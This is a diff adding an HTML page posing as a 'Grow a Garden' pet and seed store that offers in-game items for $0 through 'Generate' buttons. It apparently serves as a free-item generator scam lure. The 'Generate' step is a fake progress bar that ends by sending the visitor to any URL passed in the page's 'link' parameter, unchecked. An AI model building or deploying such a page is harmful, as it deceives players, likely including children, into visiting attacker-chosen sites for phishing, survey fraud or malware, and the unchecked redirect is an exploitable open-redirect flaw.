@@ -1,0 +1,102 @@
+<!-- pets/index.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Grow a Garden - Pet & Fruit Store</title>
+  <style>
+    body { font-family: Arial; background: #f1f8e9; text-align: center; }
+    .store-grid { display: flex; flex-wrap: wrap; justify-content: center; }
+    .card { background: #aed581; border-radius: 10px; margin: 10px; padding: 15px; width: 180px; }
+    .card img { width: 100px; height: 100px; }
+    .controls { margin: 10px 0; }
+    .controls button { background: #33691e; color: #fff; border: none; padding: 5px 10px; border-radius: 5px; }
+    .generate-btn { background: gold; border: none; padding: 10px 15px; border-radius: 6px; margin-top: 10px; cursor: pointer; }
+    #loading-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; color: white; justify-content: center; align-items: center; flex-direction: column; z-index: 1000; }
+    .progress-bar { width: 80%; background: #555; border-radius: 8px; overflow: hidden; }
+    .progress-bar-fill { background: #00e676; width: 0; height: 30px; line-height: 30px; text-align: center; color: black; }
+  </style>
+</head>
+<body>
+  <h1>🌱 Grow a Garden - Pet & Fruit Store</h1>
+  <div class="store-grid" id="storeGrid"></div>
+
+  <div id="loading-screen">
+    <h2>Loading... <span id="percent">0%</span></h2>
+    <div class="progress-bar"><div class="progress-bar-fill" id="progress-fill">0%</div></div>
+  </div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const redirectLink = params.get("link") || "https://default-link.com";
+
+    const pets = [
+      { id: "boneBlossom", name: "Bone Blossom", price: "$18.99", image: "https://static.wikia.nocookie.net/growagarden/images/3/3c/BoneBlossomCrop.png" },
+      { id: "discoBee", name: "Disco Bee", price: "$28.99", image: "https://static.wikia.nocookie.net/growagarden/images/f/f2/DiscoBeeIcon.gif" },
+      { id: "fennecFox", name: "Fennec Fox", price: "$29.99", image: "https://static.wikia.nocookie.net/growagarden/images/e/e8/FennecFoxIcon.png" },
+      { id: "raccoon", name: "Raccoon", price: "$21.99", image: "https://static.wikia.nocookie.net/growagarden/images/5/54/Raccon_Better_Quality.png" },
+      { id: "mimicOctopus", name: "Mimic Octopus", price: "$35.99", image: "https://static.wikia.nocookie.net/growagarden/images/0/00/MimicOctopusIcon.webp" },
+      { id: "butterfly", name: "Butterfly Pet", price: "$18.99", image: "https://static.wikia.nocookie.net/growagarden/images/1/18/Thy_Butterfly_V2.png" },
+      { id: "scarletMacaw", name: "Scarlet Macaw", price: "$33.99", image: "https://static.wikia.nocookie.net/growagarden/images/2/21/ScarletMacawIcon.webp" },
+      { id: "dragonfly", name: "Dragonfly Pet", price: "$21.99", image: "https://static.wikia.nocookie.net/growagarden/images/c/c9/DragonflyIcon.png" },
+      { id: "queenBee", name: "Queen Bee", price: "$19.99", image: "https://static.wikia.nocookie.net/growagarden/images/7/7a/Queen_bee.png" },
+      { id: "redFox", name: "Red Fox", price: "$23.99", image: "https://static.wikia.nocookie.net/growagarden/images/d/d5/RedFox.png" }
+    ];
+
+    const fruits = [
+      { id: "candyBlossom", name: "Candy Blossom Seed", price: "$9.99", image: "https://static.wikia.nocookie.net/growagarden/images/5/52/CandyBlossomPic.png" },
+      { id: "burningBud", name: "Burning Bud Seed", price: "$11.99", image: "https://static.wikia.nocookie.net/growagarden/images/9/98/Burning_Bud.png" },
+      { id: "dragonPepper", name: "Dragon Pepper Seed", price: "$10.99", image: "https://static.wikia.nocookie.net/growagarden/images/6/62/DragonPepperIcon.png" },
+      { id: "moonMelon", name: "Moon Melon Seed", price: "$15.99", image: "https://static.wikia.nocookie.net/growagarden/images/7/7a/MoonMelon.png" },
+      { id: "sunflowerSeed", name: "Sunflower Seed", price: "$5.99", image: "https://static.wikia.nocookie.net/growagarden/images/c/c0/Sunflower_Produce_.png" },
+      { id: "sugarApple", name: "Sugar Apple Seed", price: "$8.99", image: "https://static.wikia.nocookie.net/growagarden/images/a/a7/SugarAppleIcon.png" },
+      { id: "feijoa", name: "Feijoa Seed", price: "$11.99", image: "https://static.wikia.nocookie.net/growagarden/images/5/54/FeijoaIcon.png" },
+      { id: "loquat", name: "Loquat Seed", price: "$7.99", image: "https://static.wikia.nocookie.net/growagarden/images/9/9d/LoquatProduce.png" }
+    ];
+
+    const allItems = [...pets, ...fruits];
+    const counts = Array(allItems.length).fill(0);
+
+    function renderStore() {
+      document.getElementById('storeGrid').innerHTML = allItems.map((item, i) => `
+        <div class="card">
+          <h3>${item.name}</h3>
+          <img src="${item.image}" alt="${item.name}">
+          <p><del>${item.price}</del> <strong>$0</strong></p>
+          <div class="controls">
+            <button onclick="adjust(${i}, -1)">-</button>
+            <span id="count-${i}">0</span>
+            <button onclick="adjust(${i}, 1)">+</button>
+          </div>
+          <button class="generate-btn" onclick="generate()">Generate</button>
+        </div>
+      `).join('');
+    }
+
+    function adjust(i, val) {
+      counts[i] += val;
+      if (counts[i] < 0) counts[i] = 0;
+      document.getElementById(`count-${i}`).textContent = counts[i];
+    }
+
+    function generate() {
+      document.getElementById('loading-screen').style.display = 'flex';
+      let progress = 0;
+      const fill = document.getElementById('progress-fill');
+      const percent = document.getElementById('percent');
+      const timer = setInterval(() => {
+        progress++;
+        fill.style.width = progress + '%';
+        fill.textContent = progress + '%';
+        percent.textContent = progress + '%';
+        if (progress >= 100) {
+          clearInterval(timer);
+          window.location.href = redirectLink;
+        }
+      }, 25);
+    }
+
+    renderStore();
+  </script>
+</body>
+</html>
